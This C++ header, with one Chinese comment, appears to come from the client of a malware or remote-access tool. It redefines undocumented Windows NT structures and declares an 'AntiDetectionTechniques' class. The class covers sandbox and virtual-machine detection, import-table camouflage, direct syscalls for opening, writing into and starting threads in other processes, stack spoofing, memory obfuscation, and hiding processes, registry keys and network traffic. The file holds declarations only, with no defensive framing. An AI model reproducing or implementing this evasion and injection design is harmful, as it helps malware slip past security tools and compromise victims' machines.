#pragma once
#ifndef _WINSOCKAPI_
#define _WINSOCKAPI_
#endif
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <string>

// 为没有 winternl.h 的环境定义 NT 结构
#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef _UNICODE_STRING_DEFINED
#define _UNICODE_STRING_DEFINED
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
#endif

#ifndef _OBJECT_ATTRIBUTES_DEFINED
#define _OBJECT_ATTRIBUTES_DEFINED
typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
#endif

#ifndef _CLIENT_ID_DEFINED
#define _CLIENT_ID_DEFINED
typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;
#endif

#ifndef _RTL_USER_PROCESS_PARAMETERS_DEFINED
#define _RTL_USER_PROCESS_PARAMETERS_DEFINED
typedef struct _RTL_USER_PROCESS_PARAMETERS {
    BYTE           Reserved1[16];
    PVOID          Reserved2[10];
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;
#endif

#ifndef _PEB_DEFINED
#define _PEB_DEFINED
typedef struct _PEB {
    BYTE                          Reserved1[2];
    BYTE                          BeingDebugged;
    BYTE                          Reserved2[1];
    PVOID                         Reserved3[2];
    PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
    PVOID                         Reserved4[3];
    PVOID                         AtlThunkSListPtr;
    PVOID                         Reserved5;
    ULONG                         Reserved6;
    PVOID                         Reserved7;
    ULONG                         Reserved8;
    ULONG                         AtlThunkSListPtr32;
    PVOID                         Reserved9[45];
    BYTE                          Reserved10[96];
    PVOID                         PostProcessInitRoutine;
    BYTE                          Reserved11[128];
    PVOID                         Reserved12[1];
    ULONG                         SessionId;
} PEB, *PPEB;
#endif

#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }
#endif

namespace Formidable {
namespace Client {
namespace Security {

class AntiDetectionTechniques {
public:
    static void InitializeAntiDetection();
    static void ApplyTechniques();
    static bool IsSandboxDetected();
    
    class AntiSandbox {
    public:
        static bool CheckResources();
        static bool CheckHardware();
        static bool CheckTiming();
        static bool CheckArtifacts();
        static bool CheckUserActivity();
        static bool IsVirtualMachine();
    };

    class IatCamouflage {
    public:
        static LONG CALLBACK ExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo);
        static PVOID GetFunctionAddressSecure(const char* dll, const char* func);
    };
    
    class SyscallBypass {
    public:
        static NTSTATUS DirectNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
        static NTSTATUS DirectNtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
        static NTSTATUS DirectNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
        static NTSTATUS DirectNtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, ULONG_PTR ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
        static NTSTATUS DirectNtTerminateProcess(HANDLE ProcessHandle, NTSTATUS ExitStatus);
    private:
        static DWORD GetSyscallNumber(const char* functionName);
        static NTSTATUS InternalExecuteSyscall(DWORD syscallNum, PVOID arg1, PVOID arg2, PVOID arg3, PVOID arg4, PVOID arg5 = nullptr, PVOID arg6 = nullptr, PVOID arg7 = nullptr, PVOID arg8 = nullptr, PVOID arg9 = nullptr, PVOID arg10 = nullptr, PVOID arg11 = nullptr);
    };

    class StackSpoofer {
    public:
        static PVOID SpoolCall(PVOID function, PVOID arg1 = nullptr, PVOID arg2 = nullptr, PVOID arg3 = nullptr, PVOID arg4 = nullptr);
    };

    class MemoryObfuscator {
    public:
        static void ObfuscateMemory(PVOID baseAddress, SIZE_T size, bool protect);
    };

    class ProcessManipulation {
    public:
        static void HideProcess();
        static void MimicLegitimateProcess();
        static void ApplyProcessCamouflage();
    };
    
    class RegistryManipulation {
    public:
        static void HideRegistryEntries();
        static void CreateLegitimateRegistryKeys();
        static void ApplyRegistryCamouflage();
    };
    
    class NetworkManipulation {
    public:
        static void HideNetworkActivity();
        static void MimicLegitimateNetwork();
        static void ApplyNetworkCamouflage();
    };
};

} // namespace Security
} // namespace Client
} // namespace Formidable
